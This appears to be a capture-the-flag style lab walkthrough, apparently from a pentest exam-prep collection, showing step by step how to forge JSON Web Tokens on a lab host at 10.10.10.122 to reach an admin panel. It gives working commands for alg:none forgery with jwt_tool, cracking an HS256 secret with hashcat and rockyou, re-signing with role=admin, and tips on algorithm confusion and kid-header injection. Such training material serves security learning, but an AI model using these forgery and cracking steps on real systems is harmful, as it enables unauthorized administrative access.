# Scenario 15 — JWT None-Alg / Weak HS256 to Admin Panel

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 12 Web Apps, 18 Crypto
**Tools:** [nmap](../../tools/nmap.md), `curl`, `jwt_tool`, [hashcat](../../tools/hashcat.md)

## Story
Target `http://10.10.10.122`. Register a normal user, then forge a JWT to access `/admin` and read the flag.

## Step 1 — Scan + map
```bash
nmap -sV -p 80,443 10.10.10.122
curl -s http://10.10.10.122/ | head
```
**Expected finding:** Node/Express app with `/login`, `/register`, `/admin`.

## Step 2 — Register + capture token
```bash
curl -s -X POST http://10.10.10.122/register \
     -d 'user=pentest&pass=pentest'
TOKEN=$(curl -s -X POST http://10.10.10.122/login \
     -d 'user=pentest&pass=pentest' -c c.txt -b c.txt \
     | jq -r .token)
echo $TOKEN
```
**Expected finding:** `eyJhbGciOiJIUzI1NiI...` — a JWT.

## Step 3 — Decode header + payload
```bash
python3 -c "import base64,sys; [print(base64.urlsafe_b64decode(p+'==').decode()) for p in '$TOKEN'.split('.')[:2]]"
```
**Expected finding:** `{"alg":"HS256"}` header, `{"user":"pentest","role":"user"}` payload.

## Step 4A — Try alg:none forgery
```bash
jwt_tool $TOKEN -X a
# Pick the alg:none variant, flip role to admin
jwt_tool $TOKEN -T   # tamper payload: role -> admin, alg -> none
curl -H "Authorization: Bearer <forged>" http://10.10.10.122/admin
```
**Expected finding:** either `/admin` lets you in (alg:none accepted) OR returns 401 and you move to 4B.

## Step 4B — Crack the HS256 secret
```bash
echo $TOKEN > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```
**Expected finding:** secret like `supersecret` or `changeme`.
**→ Tool ref:** [hashcat -m 16500](../../tools/hashcat.md)

## Step 5 — Re-sign with cracked secret
```bash
jwt_tool $TOKEN -T -S hs256 -p 'supersecret'
# Set role=admin during -T; copy the new token.
curl -H "Authorization: Bearer <new>" http://10.10.10.122/admin
```
**Expected finding:** `/admin` returns the flag.

## Step 6 — Final answer
**Answer format:** flag string from `/admin`.

## Gotchas across this chain
- `alg:none` must usually be lowercase; some libs also accept `None`.
- The empty signature matters: token ends with a trailing `.` and nothing after.
- Hashcat mode `16500` is JWT; the full token goes in the hashfile, not just the signature.
- Some JWTs are RS256 — you can't brute those; try alg-confusion (RS256→HS256 with public key).
- Check `kid` header for injection / path-traversal tricks.

## Variant questions this scenario teaches you to handle
- "Decode this JWT" → step 3.
- "What algorithm is in use?" → step 3 header.
- "Crack the JWT signing secret" → step 4B.
- "Forge an admin JWT" → steps 4–5.
